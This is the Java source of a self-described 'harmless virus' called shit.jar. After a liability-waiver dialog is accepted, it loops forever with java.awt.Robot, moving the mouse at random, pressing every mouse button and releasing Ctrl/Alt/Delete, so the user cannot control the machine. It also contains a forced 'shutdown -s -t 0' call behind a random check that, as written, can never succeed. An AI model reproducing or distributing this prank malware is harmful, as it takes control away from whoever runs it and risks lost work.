package com.github.mechanictc2.shit.jar;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Robot;
import java.awt.Toolkit;
import java.io.IOException;
import java.util.Random;

import javax.swing.ImageIcon;
import javax.swing.JOptionPane;

/**
 * shit.jar is a harmless virus that I programmed. Read the disclaimer!!
 * @author Nathan Kwok
 * @since 2023-10-25
 * @version v1.10.0
 */
class Main {
	private static int xCoord;
	private static int yCoord;
	private static int result;
	private static Random rand;
	private static Robot robot;
	private static Dimension screenSize;
	private static Runtime runtime;
	private static String title = "Thank you for downloading shit.jar!";
	private static ImageIcon icon;
	private static String disclaimer =
			"\nThank you for downloading shit.jar! Please read the following:"
			+ "\nThis letter serves as a Release of Liability Contract (\"Contract\") between MechanicTC2 (\"Provider\") and the (\"Client\") regarding the services to be"
			+ "\nprovided by the Provider to the Client:"
			+ "\nIn consideration of the Services provided by the Provider, the Client hereby releases, waives, and discharges the Provider,"
			+ "\nits employees, officers, agents, and affiliates from any and all claims, damages, liabilities, actions,or causes of action arising"
			+ "\nout of or in connection with the Services, including but not limited to any loss of data, software malfunction, or damage to hardware or peripherals."
			+ "\nThe Client agrees to indemnify, defend, and hold harmless the Provider and its representatives from and against any and all claims,"
			+ "\ndamages, liabilities, costs, and expenses (including reasonable attorney fees) arising out of or in connection with any third-party claims resulting"
			+ "\nfrom the Services performed by the Provider.";

	@SuppressWarnings("deprecation")
	public static void main(String[] args) {
		icon = new ImageIcon(System.getProperty("user.dir") + "\\src\\com\\github\\mechanictc2\\shit\\jar\\shit.jar.png");
		result = JOptionPane.showConfirmDialog(null, disclaimer, title, JOptionPane.OK_CANCEL_OPTION, JOptionPane.WARNING_MESSAGE, icon);
		if (result != JOptionPane.OK_OPTION) {
		}
		else {
			rand = new Random();
			screenSize = Toolkit.getDefaultToolkit().getScreenSize();
		    while (true) {
		    	try {
		    		xCoord = (int) rand.nextDouble(screenSize.getWidth());
			        yCoord = (int) rand.nextDouble(screenSize.getHeight());
			        robot = new Robot();
			        robot.mouseMove(xCoord, yCoord);
			        robot.mousePress(1024); //BUTTON1
	  		        robot.mousePress(2048); //BUTTON2
	  		        robot.mousePress(4096); //BUTTON3
	  		        robot.keyRelease(17);  //VK_CONTROL
	  		        robot.keyRelease(18);  //VK_ALT
	  		        robot.keyRelease(127); //VK_DELETE
	  		        if (rand.nextInt(1000) == 1000) {
	  	  		     	runtime = Runtime.getRuntime();
	  	  				try {
	  	  					runtime.exec("shutdown -s -t 0");
	  	  				}
	  	  				catch (IOException e) {
	  	  		    		System.out.println("fatal error!");
	  	  					e.printStackTrace();
	  	  				}
	  		        }
	  		    }
		    	catch (AWTException e) {
		    		System.out.println("fatal error!");
		    		e.printStackTrace();
		    	}
		    }
		}
	}
}